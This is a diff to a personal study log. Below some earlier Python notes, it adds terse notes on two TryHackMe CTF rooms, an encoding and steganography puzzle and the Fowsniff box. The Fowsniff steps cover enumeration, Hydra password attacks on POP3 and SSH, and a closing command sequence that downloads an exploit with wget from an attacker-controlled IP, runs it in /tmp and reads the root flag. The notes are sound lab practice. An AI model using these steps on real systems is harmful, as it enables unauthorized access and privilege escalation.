@@ -53,3 +53,28 @@ months.mode, months.readable(), months.readLines(),months.seek(0)
 to write: open('days.txt',"w"), days.write("Monday")
 classes n objects
 def_init(self,...), self.price, if not(isinstance(...))
+
+Day 19:, used the decoded one to open file to get flag
+Did the following rooms on thm:
+TheImpossibleChallenge: downloaded zip file to crack password..took that string, did rot13,rot47,hex, base 64, went to developers tools, found a text
+used it in Unicode zero-width characters steg, used the decoded one to open file to get flag
+Fowsniff CTF: Identifying target host by using the Netdiscover utility
+              Identifying open port by using the Nmap scan
+              Enumerating HTTP service by using the Dirb utility
+              Extracting information from the Internet about the target
+              Cracking password hashes -crackstation
+              Launching dictionary attack with Hydra-using username and passwd list
+              Accessing POP3 service with NetCut- nc ip 110, pop3 is to check mails
+              Retrieving emails - retr 1,2 
+              Launching dictionary attack with Hydra for SSH-passwd reset was in one of the mails
+              Taking access of target machine-login using ssh, uname -a to find out kernel, download an exploit using wget frm exloitdb
+              Searching for local exploit
+              Downloading exploit on the attacker machine and compiling
+              Transferring exploit on target machine and exploiting
+              Reading flag file
+              
+<<cd /tmp/ >>
+<<wget 192.168.1.107/exploit >>
+<<chmod +x exploit >>
+<<./exploit >>
+in tmp do id, cat /root/flag to get flag
